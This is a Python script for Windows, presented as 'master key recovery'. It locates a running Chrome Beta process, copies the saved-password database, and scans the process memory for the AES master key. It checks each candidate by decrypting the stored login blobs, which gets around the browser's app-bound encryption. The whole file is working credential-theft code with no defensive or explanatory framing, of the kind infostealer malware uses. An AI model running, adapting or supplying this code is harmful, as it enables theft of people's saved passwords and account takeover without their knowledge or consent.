"""
Chrome Beta v157 — master key recovery via process memory scan.
Finds the 32-byte AES-256-GCM master key from a running chrome.exe (Chrome Beta) process.
"""
import ctypes
import ctypes.wintypes as wt
import os
import sqlite3
import shutil

k32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)

PROCESS_VM_READ        = 0x0010
PROCESS_QUERY_LIMITED  = 0x1000
MEM_COMMIT   = 0x1000
MEM_PRIVATE  = 0x20000
PAGE_NOACCESS = 0x01
PAGE_GUARD    = 0x100


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress",       ctypes.c_void_p),
        ("AllocationBase",    ctypes.c_void_p),
        ("AllocationProtect", wt.DWORD),
        ("RegionSize",        ctypes.c_size_t),
        ("State",             wt.DWORD),
        ("Protect",           wt.DWORD),
        ("Type",              wt.DWORD),
    ]


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",             wt.DWORD),
        ("cntUsage",           wt.DWORD),
        ("th32ProcessID",      wt.DWORD),
        ("th32DefaultHeapID",  ctypes.POINTER(wt.ULONG)),
        ("th32ModuleID",       wt.DWORD),
        ("cntThreads",         wt.DWORD),
        ("th32ParentProcessID",wt.DWORD),
        ("pcPriClassBase",     wt.LONG),
        ("dwFlags",            wt.DWORD),
        ("szExeFile",          ctypes.c_char * 260),
    ]


def ardacan_find_pid() -> int:
    """Return lowest PID of a chrome.exe process whose full path contains 'Chrome Beta'."""
    k32.QueryFullProcessImageNameW.argtypes = [
        ctypes.c_void_p, wt.DWORD, ctypes.c_wchar_p, ctypes.POINTER(wt.DWORD)
    ]
    k32.QueryFullProcessImageNameW.restype  = wt.BOOL

    snap = k32.CreateToolhelp32Snapshot(0x2, 0)
    pe   = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(pe)
    k32.Process32First(snap, ctypes.byref(pe))

    found = 0
    while True:
        if pe.szExeFile.lower() == b"chrome.exe":
            hp = k32.OpenProcess(PROCESS_QUERY_LIMITED, False, pe.th32ProcessID)
            if hp:
                buf = ctypes.create_unicode_buffer(512)
                sz  = wt.DWORD(512)
                if k32.QueryFullProcessImageNameW(hp, 0, buf, ctypes.byref(sz)):
                    if "Chrome Beta" in buf.value:
                        if found == 0 or pe.th32ProcessID < found:
                            found = pe.th32ProcessID
                k32.CloseHandle(hp)
        if not k32.Process32Next(snap, ctypes.byref(pe)):
            break
    k32.CloseHandle(snap)
    return found


def ardacan_load_blobs() -> list[bytes]:
    """Read all v20 password blobs from Chrome Beta Login Data."""
    lad  = os.environ.get("LOCALAPPDATA", "")
    ld   = os.path.join(lad, "Google", "Chrome Beta", "User Data", "Default", "Login Data")
    if not os.path.isfile(ld):
        return []
    tmp  = os.path.join(os.environ.get("TEMP", ""), "_ref_scan.db")
    try:
        shutil.copy2(ld, tmp)
        con  = sqlite3.connect(tmp)
        rows = con.execute(
            "SELECT password_value FROM logins WHERE password_value IS NOT NULL"
        ).fetchall()
        con.close()
        try: os.unlink(tmp)
        except: pass
        return [bytes(b) for (b,) in rows if len(b) > 19 and b[:3] in (b"v20", b"v10")]
    except Exception:
        return []


def ardacan_verify(candidate: bytes, ref_blobs: list[bytes]) -> bool:
    """Return True if candidate decrypts any reference blob."""
    from Crypto.Cipher import AES
    for rb in ref_blobs:
        try:
            AES.new(candidate, AES.MODE_GCM, nonce=rb[3:15]).decrypt_and_verify(
                rb[15:-16], rb[-16:]
            )
            return True
        except Exception:
            pass
    return False


def ardacan_scan(pid: int, ref_blobs: list[bytes]) -> bytes | None:
    """
    Walk the virtual address space of `pid` and search for the 32-byte AES master key.
    Returns the key bytes on success, None if not found.
    """
    if not ref_blobs:
        return None

    hp = k32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED, False, pid)
    if not hp:
        return None

    mbi   = MEMORY_BASIC_INFORMATION()
    addr  = 0
    found = None

    try:
        while ctypes.sizeof(mbi) == k32.VirtualQueryEx(
            hp, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)
        ):
            size = mbi.RegionSize
            prot = mbi.Protect

            if (
                mbi.State  == MEM_COMMIT
                and mbi.Type == MEM_PRIVATE
                and size    <= 8 * 1024 * 1024
                and prot    != PAGE_NOACCESS
                and not (prot & PAGE_GUARD)
            ):
                buf  = (ctypes.c_ubyte * size)()
                read = ctypes.c_size_t(0)
                if k32.ReadProcessMemory(hp, mbi.BaseAddress, buf, size, ctypes.byref(read)):
                    n = read.value
                    raw = bytes(buf[:n])
                    for off in range(0, n - 32, 4):
                        candidate = raw[off:off + 32]
                        if ardacan_verify(candidate, ref_blobs):
                            found = candidate
                            break
                if found:
                    break

            next_addr = (mbi.BaseAddress or 0) + size
            if next_addr <= addr:
                break
            addr = next_addr
    finally:
        k32.CloseHandle(hp)

    return found


def ardacan_get_key() -> bytes | None:
    """High-level entry point: find Chrome Beta PID, scan memory, return 32-byte key."""
    ref_blobs = ardacan_load_blobs()
    if not ref_blobs:
        print("[!] No v20 reference blobs found in Login Data")
        return None

    pid = ardacan_find_pid()
    if not pid:
        print("[!] Chrome Beta process not found")
        return None

    print(f"[*] Chrome Beta PID: {pid}")
    print(f"[*] Reference blobs: {len(ref_blobs)}")

    key = ardacan_scan(pid, ref_blobs)
    if key:
        print(f"[+] Master key found: {key.hex()}")
    else:
        print("[-] Master key not found in memory")
    return key


if __name__ == "__main__":
    ardacan_get_key()
